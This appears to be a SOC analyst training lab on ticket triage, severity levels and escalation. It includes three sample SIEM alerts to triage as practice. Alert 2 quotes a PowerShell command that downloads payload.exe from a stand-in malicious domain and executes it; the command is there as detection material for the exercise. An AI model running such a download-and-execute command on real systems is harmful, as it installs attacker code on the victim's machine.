# Day#31- SOC Operations: Ticketing and Workflow Management

---

## 🎯 Objective

To understand the day-to-day operational workflow of a SOC Analyst, including ticket triage, prioritization, escalation procedures, and case management using industry-standard ticketing systems.

---

## 🖥️ Lab Setup

### **System Requirements**
- **Operating System:** Windows or Linux
- **Web Browser:** Chrome, Firefox, or Edge
- **Ticketing Platform:** ServiceNow (free developer instance) OR Jira (free tier) OR TheHive (open-source)

### **Tools Required**
- ServiceNow Developer Instance: [Sign up here](https://developer.servicenow.com/)
- OR Jira Free Tier: [Sign up here](https://www.atlassian.com/software/jira/free)
- OR TheHive: [Download here](https://thehive-project.org/)

---

## 📘 What is SOC Ticketing?

**SOC Ticketing** is the systematic process of tracking, documenting, and managing security alerts and incidents from detection through resolution. Every security event that requires investigation is logged as a ticket (or case) in a ticketing system.

### **Why Ticketing Matters**
- **Accountability:** Clear ownership of security incidents
- **Tracking:** Monitor progress from detection to closure
- **Metrics:** Measure MTTD (Mean Time To Detect) and MTTR (Mean Time To Respond)
- **Compliance:** Audit trail for regulatory requirements
- **Knowledge Base:** Historical reference for similar incidents

---

## 🎫 Ticket Lifecycle in a SOC

```
Alert Generated → Ticket Created → Triage → Investigation →
Escalation (if needed) → Containment → Resolution → Closure → Post-Incident Review
```

### **Ticket States**
| State | Description | Owner |
|-------|-------------|-------|
| **New** | Ticket just created from alert | Unassigned |
| **Assigned** | Ticket assigned to analyst | L1 Analyst |
| **In Progress** | Active investigation underway | L1/L2 Analyst |
| **Escalated** | Requires senior analyst or IR team | L2/L3/IR Team |
| **Pending** | Waiting for external input (user, vendor) | Assigned Analyst |
| **Resolved** | Incident contained and remediated | Assigned Analyst |
| **Closed** | Final documentation complete | SOC Manager |
| **False Positive** | Alert was benign, tuning required | L1 Analyst |

---

## 🔍 Ticket Triage and Prioritization

### **Triage Process**
1. **Validate the Alert:** Is this a true positive or false positive?
2. **Determine Severity:** How critical is this incident?
3. **Assess Scope:** How many systems/users are affected?
4. **Check for Active Threat:** Is the threat ongoing or historical?
5. **Assign Priority:** Based on severity and business impact

### **Severity Classification**

| Severity | Criteria | SLA Response Time | Examples |
|----------|----------|-------------------|----------|
| **Critical (P1)** | Active data breach, ransomware, C2 communication | 15 minutes | Active C2 beaconing, ransomware encryption, data exfiltration in progress |
| **High (P2)** | Confirmed malware, privilege escalation, successful intrusion | 1 hour | Malware execution, privilege escalation, lateral movement detected |
| **Medium (P3)** | Suspicious activity, policy violation, potential compromise | 4 hours | Multiple failed logins, port scanning, policy violations |
| **Low (P4)** | Informational, minor policy violation, low-risk activity | 24 hours | Single failed login, informational alerts, routine scans |
| **False Positive** | Benign activity misidentified as threat | Document for tuning | Legitimate admin activity, known safe processes |

---

## 📊 Key Ticket Fields

Every SOC ticket should contain:

| Field | Purpose | Example |
|-------|---------|---------|
| **Ticket ID** | Unique identifier | INC0012345 |
| **Alert Source** | SIEM, EDR, IDS that generated alert | Wazuh, Splunk, CrowdStrike |
| **Alert Name/Rule** | Detection rule that triggered | SSH Brute Force Detected |
| **Date/Time** | When alert was generated | 2024-12-29 14:32:15 UTC |
| **Severity** | P1-P4 classification | P2 - High |
| **Affected Assets** | Systems, IPs, users involved | 192.168.1.50, user: jsmith |
| **IOCs** | Indicators of Compromise | IP: 203.0.113.45, Hash: d41d8cd... |
| **Assigned To** | Analyst handling the case | Jane Doe (L1) |
| **Status** | Current ticket state | In Progress |
| **Description** | Summary of the incident | Multiple failed SSH authentication attempts from external IP |
| **Investigation Notes** | Analyst findings and actions taken | Checked auth.log, confirmed 150 failed attempts in 5 minutes |
| **Resolution** | Actions taken to resolve | Blocked IP at firewall, reset user password |
| **Root Cause** | Why the incident occurred | Weak password susceptible to brute force |

---

## 🚨 Escalation Procedures

### **When to Escalate**

Escalate from **L1 → L2** when:
- Confirmed malware or intrusion beyond initial triage
- Multiple systems affected
- Advanced technical analysis required
- Incident persists after initial containment

Escalate from **L2 → L3/IR Team** when:
- Active data breach or exfiltration
- Ransomware or destructive malware
- APT (Advanced Persistent Threat) indicators
- Legal/regulatory notification required
- Executive-level systems compromised

Escalate to **Management** when:
- Incident meets reporting thresholds
- Media/PR involvement likely
- Regulatory notification required (GDPR, HIPAA)
- Business-critical systems offline

### **Escalation Best Practices**
✅ Provide complete ticket with all investigation notes
✅ Summarize findings clearly
✅ List IOCs and affected systems
✅ Suggest next steps
✅ Be available for handoff discussion

❌ Don't escalate without initial triage
❌ Don't escalate without documenting your findings
❌ Don't delay escalation for critical incidents

---

## 🛠️ Lab Task: Creating and Managing SOC Tickets

### **Scenario**
You are an L1 SOC Analyst who has received the following alerts from your SIEM. You need to create tickets, triage them, and determine appropriate actions.

---

### **Alert 1: Multiple Failed SSH Login Attempts**
```
Alert: SSH Brute Force Detected
Source IP: 45.67.89.123 (External)
Destination: 192.168.10.50 (Production Web Server)
User Attempted: root, admin, ubuntu, test
Failed Attempts: 247 in 10 minutes
Time: 2024-12-29 03:15:22 UTC
```

### **Alert 2: Suspicious PowerShell Execution**
```
Alert: PowerShell Script Block Logging - Suspicious Command
Host: WORKSTATION-42 (192.168.10.105)
User: jdoe
Command: Invoke-WebRequest -Uri "http://malicious-domain.com/payload.exe" -OutFile "C:\Temp\update.exe"; Start-Process "C:\Temp\update.exe"
Time: 2024-12-29 09:45:10 UTC
Event ID: 4104
```

### **Alert 3: Unusual Outbound Traffic**
```
Alert: High Volume Outbound Connection
Source: 192.168.10.75 (Finance-PC-09)
Destination IP: 185.220.101.45 (Russia)
Destination Port: 4444
Protocol: TCP
Bytes Transferred: 2.3 GB
Duration: 45 minutes
Time: 2024-12-29 11:20:00 UTC
```

---

### **Step 1: Create Tickets for Each Alert**

For each alert, create a ticket using this template:

```
TICKET: INC00XXXXX
========================================
Alert Source: [SIEM/EDR/IDS]
Alert Name: [Rule Name]
Severity: [P1/P2/P3/P4]
Date/Time: [UTC]
Status: New

AFFECTED ASSETS:
- IP Address(es):
- Hostname(s):
- User Account(s):

INDICATORS OF COMPROMISE (IOCs):
- External IP(s):
- Domain(s):
- File Hash(es):
- URL(s):

INITIAL ASSESSMENT:
[Brief description of what the alert indicates]

RECOMMENDED ACTION:
[Investigate/Escalate/Block/Monitor]
```

### **Step 2: Triage and Prioritize**

For each ticket:
1. Determine the severity (P1-P4)
2. Assess if it's a true positive or false positive
3. Identify immediate containment actions
4. Decide if escalation is needed

### **Step 3: Document Investigation Steps**

For **Alert 2** (Suspicious PowerShell), document what you would investigate:
```
INVESTIGATION NOTES:
========================================
[Timestamp] Action Taken
[Timestamp] Findings
[Timestamp] Next Steps
```

Example investigation steps:
- Check if the file `C:\Temp\update.exe` still exists
- Query VirusTotal for the domain reputation
- Check if the process is still running
- Review other activity from user 'jdoe'
- Check if file was executed successfully

### **Step 4: Determine Escalation**

For each ticket, document:
- **Escalate?** Yes/No
- **Escalate To:** L2/L3/IR Team/Management
- **Reason:** [Why escalation is needed]
- **Recommended Actions:** [What the escalated team should do]

---

## 📸 Submission

Submit the following:

1. **Three completed tickets** (one for each alert) with:
   - Severity classification
   - True Positive/False Positive assessment
   - Initial triage notes
   - Escalation decision

2. **Detailed investigation plan** for Alert 2 (PowerShell)
   - At least 5 investigation steps
   - Tools you would use
   - Expected findings

3. **Escalation justification** for any ticket marked for escalation

**Format:** Document, screenshot, or text file with all ticket information

---

## 🎓 Learning Outcome

After completing this lab, you will:

- Understand the SOC ticket lifecycle from creation to closure
- Know how to triage and prioritize security alerts effectively
- Apply severity classification based on business impact
- Document incidents clearly for escalation and audit purposes
- Make informed decisions about when to escalate incidents
- Recognize the difference between true positives and false positives
- Understand SLA requirements and response time expectations
- Build foundational skills for SOC analyst operational workflows

---

## 💡 Key Takeaways

✅ **Every alert deserves documentation** - Even false positives help with tuning
✅ **Triage is critical** - Proper prioritization ensures critical incidents get immediate attention
✅ **SLAs matter** - Response time expectations are based on severity
✅ **Clear communication** - Tickets should tell the complete story without verbal explanation
✅ **Escalation is not failure** - Knowing when to escalate shows good judgment
✅ **Metrics drive improvement** - Track MTTD and MTTR to measure SOC effectiveness

---

## 📚 Additional Resources

- [NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- [ServiceNow Security Operations Documentation](https://docs.servicenow.com/)
- [TheHive Project - Open Source Incident Response Platform](https://thehive-project.org/)
- [SANS Incident Handler's Handbook](https://www.sans.org/white-papers/33901/)
